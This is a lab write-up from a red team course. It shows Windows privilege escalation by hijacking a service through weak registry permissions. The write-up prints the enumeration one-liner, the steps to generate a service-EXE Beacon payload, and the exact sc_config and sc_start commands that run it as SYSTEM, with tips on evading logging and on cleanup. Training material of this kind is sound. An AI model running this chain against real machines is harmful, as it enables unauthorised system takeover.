# CRTO — Privilege Escalation Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Privilege Escalation
**Objective:** Exploit weak registry permissions on a service to escalate from low-privilege user to SYSTEM

---

## The Full Chain

```
Enumerate service registry ACLs → find FullControl for low-priv groups
    ↓
Generate Windows Service EXE payload (http_x64.svc.exe)
    ↓
Stop BadWindowsService
    ↓
Upload payload to C:\Temp
    ↓
sc_config → redirect service binary path to our payload
    ↓
sc_start → service launches as SYSTEM → Beacon checks in elevated
    ↓
Restore original binary path + delete payload + restart service (cleanup)
```

---

## Step 1 — Enumeration

Set `spawnto` for post-ex operations first:

```
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

Enumerate service registry keys where low-privilege groups have `FullControl`:

```powershell
powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
```

**What this query does:**

| Filter | Purpose |
|---|---|
| `AccessControlType -eq 'Allow'` | Only explicit allow ACEs |
| `IsInherited -eq $false` | Only explicitly set permissions, not inherited from parent key |
| `$lowpriv -contains $ace.IdentityReference` | Check if the ACE grants rights to a low-priv group |
| `RegistryRights -eq FullControl` | Only care about full control — read-only is not exploitable |

> Expected result: `BadWindowsService` — low-priv users have `FullControl` on its registry key, meaning we can rewrite its `ImagePath` value.

**TTP:** T1007 — System Service Discovery
**Why `powerpick` over `powershell`:** Runs PowerShell in-process inside Beacon — no `powershell.exe` process spawned, bypasses script-block logging and AMSI in the Beacon process context.

---

## Step 2 — Generate Service EXE Payload

```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

Payloads > Windows Stageless Payload
Listener: http
Output:   Windows Service EXE
Save to:  C:\Payloads\http_x64.svc.exe
```

**Why `Windows Service EXE` output specifically:**

Services are started by the Service Control Manager (SCM), which expects a binary that calls `RegisterServiceCtrlHandler` and enters a service loop. A standard EXE payload won't satisfy the SCM and the service start will fail/time out. The service EXE wrapper handles the SCM handshake and then executes the Beacon shellcode.

---

## Step 3 — Exploitation

```bash
# Stop the service first (required to change binary path)
sc_stop BadWindowsService

# Stage payload in a writable directory
cd C:\Temp
upload C:\Payloads\http_x64.svc.exe

# Check current binary path (document it — needed for restore)
sc_qc BadWindowsService

# Redirect service to our payload
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2

# Start service → executes as SYSTEM → Beacon checks in elevated
sc_start BadWindowsService
```

**`sc_config` argument breakdown:**

```
sc_config <service_name> <binary_path> <start_type> <error_control>
```

| Argument | Value | Meaning |
|---|---|---|
| `binary_path` | `C:\Temp\http_x64.svc.exe` | Path to our malicious service binary |
| `start_type` | `0` | Boot start (0=Boot, 1=System, 2=Auto, 3=Manual, 4=Disabled) |
| `error_control` | `2` | Severe — SCM will attempt restart on failure |

> **Why services run as SYSTEM:** By default, Windows services run under `NT AUTHORITY\SYSTEM` unless explicitly configured otherwise. That's what makes misconfigured service permissions such a reliable privesc path.

---

## Step 4 — Cleanup (Required)

Once the elevated Beacon checks in, immediately restore and clean up:

```bash
# Restore original binary path
sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2

# Delete the payload
rm http_x64.svc.exe

# Restart the legitimate service
sc_start BadWindowsService
```

**Why cleanup matters here:**
- Leaving a service pointing to a non-existent or malicious binary is detectable and breaks the service permanently
- Leaving `http_x64.svc.exe` in `C:\Temp` is an obvious IOC
- Restoring the service to a working state follows *primum non nocere* — the client's environment should function normally after your actions

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1007 | System Service Discovery | Enumerate service registry ACLs |
| T1574.011 | Hijack Execution Flow: Services Registry Permissions Weakness | Overwrite `ImagePath` via weak registry ACL |
| T1543.003 | Create or Modify System Process: Windows Service | Modify service config to point to malicious binary |
| T1070 | Indicator Removal | Delete payload, restore original binary path |

---

## Key Takeaways

- The vulnerability here is on the **registry key**, not the binary path — `FullControl` on `HKLM\SYSTEM\CurrentControlSet\Services\<name>` lets you rewrite `ImagePath` without touching the filesystem ACLs of the original binary
- Always run `sc_qc` before `sc_config` to capture the original binary path — you need it for the restore step
- `Windows Service EXE` output is mandatory for SCM-launched payloads — standard EXE will time out and the service start will fail
- Stop the service before reconfiguring — changing `ImagePath` on a running service may not take effect until restart anyway
- `powerpick` is always preferred over `powershell` for in-Beacon enumeration — no child process, no script-block logging
- On real engagements, this same ACL check applies to service **binary paths** too (not just registry) — check both with `icacls` on the EXE path and `Get-Acl` on the registry key
